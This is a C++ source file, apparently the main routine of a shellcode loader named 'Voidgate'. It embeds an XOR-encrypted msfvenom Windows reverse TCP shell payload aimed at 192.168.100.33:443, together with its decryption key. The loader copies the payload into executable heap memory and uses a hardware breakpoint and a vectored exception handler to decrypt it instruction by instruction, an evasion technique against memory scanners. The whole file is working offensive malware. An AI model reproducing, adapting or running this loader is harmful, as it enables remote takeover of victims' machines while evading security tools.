#include "payload.h"
#include "Voidgate.h"

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.33 LPORT=443 -f raw  (XORed)
BYTE payload[] = { 0xcc, 0x2c, 0xc2, 0x80, 0xc2, 0xc9, 0x80, 0x42, 0x53, 0x31, 0x25, 0x25, 0x25, 0x13, 0x35, 0x1, 0x1b, 0x1f, 0x5e, 0x93, 0x55, 0x2c, 0xca, 0x36, 0x52, 0x69, 0xcb, 0x10, 0x4b, 0x79, 0xef, 0x26, 0x44, 0xb, 0xec, 0x22, 0x1d, 0x1f, 0x60, 0xf6, 0x7a, 0x2e, 0xc, 0x55, 0xfb, 0x69, 0x71, 0x82, 0xff, 0xd, 0x5, 0x8, 0x66, 0x6f, 0x47, 0x11, 0x8c, 0x9e, 0x62, 0x0, 0x31, 0xa5, 0xa3, 0x89, 0x60, 0x60, 0x11, 0xa, 0xd8, 0x63, 0x44, 0xff, 0x26, 0x7f, 0x2f, 0x51, 0x9d, 0xdc, 0xef, 0xc9, 0x30, 0x64, 0x41, 0x2c, 0xb7, 0xe1, 0x34, 0x25, 0x1b, 0x30, 0xb4, 0x24, 0xef, 0xb, 0x7f, 0x14, 0xc6, 0x17, 0x4f, 0x8, 0x31, 0xb4, 0xa2, 0x32, 0x7a, 0xde, 0x89, 0x3, 0xd8, 0x5, 0xec, 0x3c, 0x65, 0x95, 0x2a, 0x61, 0x84, 0x1f, 0x5e, 0x81, 0x9c, 0x25, 0x80, 0xad, 0x3f, 0x60, 0x41, 0x83, 0x6b, 0xd1, 0x11, 0x85, 0x28, 0x40, 0x2b, 0x74, 0x45, 0x12, 0x56, 0x90, 0x45, 0xbc, 0x19, 0x20, 0xb9, 0x61, 0x64, 0xb, 0x52, 0xe1, 0x2, 0x35, 0xef, 0x4f, 0x2f, 0x14, 0xc6, 0x17, 0x73, 0x8, 0x31, 0xb4, 0x0, 0xef, 0x36, 0xa9, 0x8, 0x43, 0x83, 0x70, 0x3c, 0x35, 0x3c, 0x1d, 0x3e, 0xa, 0xc, 0xf, 0x2e, 0x18, 0x71, 0x3e, 0x9, 0xe7, 0xde, 0x1, 0x1, 0x10, 0xac, 0xd1, 0x3c, 0x35, 0x3d, 0x19, 0x2f, 0xdb, 0x5f, 0xbe, 0x38, 0xbe, 0xcf, 0x9b, 0x1c, 0x2d, 0x8c, 0x56, 0x33, 0x70, 0xc, 0x2, 0x56, 0x74, 0x64, 0x2, 0x31, 0x19, 0xc4, 0xb1, 0x27, 0xc0, 0xdc, 0xc4, 0x40, 0x64, 0x32, 0x68, 0xc9, 0xa7, 0x1a, 0x8d, 0x66, 0x74, 0x65, 0xf8, 0xa7, 0xf8, 0x53, 0xb3, 0x2e, 0x15, 0x79, 0xed, 0xa5, 0x28, 0xbb, 0xd0, 0x1, 0xf8, 0x1f, 0x46, 0x42, 0x73, 0x9b, 0x96, 0x2b, 0xd9, 0xa7, 0x3f, 0x6e, 0x40, 0x30, 0x64, 0x18, 0x25, 0x88, 0x8, 0xc0, 0x29, 0x53, 0xce, 0xb1, 0x24, 0x34, 0xe, 0x56, 0x99, 0x0, 0x66, 0xaf, 0x9, 0xcf, 0xa4, 0x9, 0xed, 0xf0, 0x69, 0xbf, 0x82, 0x1b, 0xb8, 0xa5, 0x35, 0xde, 0xa9, 0x68, 0x8f, 0xad, 0xa8, 0xba, 0x9, 0xb9, 0xa3, 0x2b, 0x74, 0x73, 0x79, 0xc, 0xcb, 0xb1, 0x79, 0xed, 0x8d, 0x25, 0xf9, 0xfe, 0xf5, 0x39, 0x36, 0x90, 0x94, 0x78, 0xe5, 0x85, 0x24, 0x30, 0x21, 0x40, 0xb, 0xeb, 0x52, 0x9, 0x10, 0x64, 0x43, 0x67, 0x50, 0x4d, 0x16, 0x3f, 0x0, 0x60, 0x2c, 0xc8, 0x86, 0x65, 0x76, 0x17, 0xf, 0x62, 0xf1, 0xe, 0x79, 0x3d, 0x2, 0x37, 0xb2, 0xb1, 0x31, 0xa8, 0x5, 0x14, 0x30, 0x40, 0x65, 0x7a, 0xac, 0x4, 0x66, 0x4b, 0xf7, 0x64, 0x1c, 0x2c, 0xca, 0x81, 0x6, 0x1d, 0x16, 0x3f, 0x0, 0x60, 0x25, 0x11, 0x2d, 0xcd, 0xe1, 0x1, 0x12, 0x1a, 0xce, 0xac, 0x39, 0xed, 0x82, 0x2b, 0xd9, 0x8c, 0x16, 0xd5, 0x38, 0xfc, 0x5b, 0xc7, 0x9b, 0xe7, 0x69, 0x71, 0x90, 0x1b, 0xce, 0xae, 0xff, 0x6a, 0x2, 0xdd, 0x58, 0xca, 0x4a, 0xf, 0xbe, 0xe5, 0xdf, 0xb1, 0xd1, 0x90, 0x77, 0x1, 0xf8, 0xf5, 0xa4, 0xd9, 0xe9, 0x9b, 0x96, 0x2f, 0xd3, 0x89, 0x7f, 0x53, 0x47, 0x4c, 0x6e, 0xc1, 0x9f, 0xd2, 0x54, 0x45, 0xf9, 0x14, 0x22, 0x16, 0x1b, 0xe, 0x43, 0x3e, 0x11, 0xc4, 0x8d, 0x90, 0x94 }; 
DWORD payload_size = sizeof(payload);

//XOR key for the encrypted payload
std::string key = "0dAd2!@BS1dtdCgPMWoA";

INT main()
{
    //Calculate the memory_size adding PADDING at the begining and at the end
    DWORD memory_size = SHELLCODE_PADDING + payload_size + SHELLCODE_PADDING;

    //Allocate memory for the payload
    PVOID heap_memory = VirtualAlloc(NULL, memory_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!heap_memory)
    {
        LogWinapiError("VirtualAlloc");
        return EXIT_FAILURE;
    }

    //Calculate the memory bounds of our payload and save them to global var
    payload_lower_bound = (DWORD64)heap_memory;
    payload_upper_bound = payload_lower_bound + memory_size;

    //Fill memory with NOP Sled and copy the payload to the heap memory
    memset(heap_memory, '\x90', memory_size);
    PVOID payload_entry = (PBYTE)heap_memory + SHELLCODE_PADDING;
    memcpy(payload_entry, payload, payload_size);

    payload_base = (DWORD64)payload_entry;

    //Put a HW Breakpoint on our payload entry point
    DWORD status = SetHardwareBreakpoint(payload_entry);

    //Install VEH to handle the payload decryption/encryption after each ASM instruction executed by the payload
    PVOID veh = AddVectoredExceptionHandler(1, &VehDecryptHeapAsm);
    if (veh)
    {
        VoidGate vg = (VoidGate)payload_entry;
        vg();
    }

    //Cleanup
    VirtualFree(heap_memory, 0, MEM_RELEASE);
    return EXIT_SUCCESS;
}